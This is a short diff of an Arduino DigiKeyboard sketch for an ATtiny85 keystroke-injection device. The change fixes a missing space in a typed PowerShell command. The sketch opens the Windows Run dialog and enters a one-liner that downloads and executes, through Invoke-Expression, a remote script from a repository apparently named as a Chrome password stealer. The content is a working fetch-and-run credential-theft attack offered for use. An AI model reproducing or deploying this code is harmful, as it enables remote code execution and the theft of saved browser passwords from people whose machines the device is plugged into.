@@ -19,7 +19,7 @@ void loop() {
  
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
   DigiKeyboard.delay(100);
-  DigiKeyboard.println("powershell start powershell -A 'Invoke-Expression (Invoke-WebRequest -Urihttps://github.com/BADTOMXXX/chrome-password-steeler-attiny85/blob/main/chrome.ps1).Content'"); 
+  DigiKeyboard.println("powershell start powershell -A 'Invoke-Expression (Invoke-WebRequest -Uri https://github.com/BADTOMXXX/chrome-password-steeler-attiny85/blob/main/chrome.ps1).Content'"); 
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(4000);
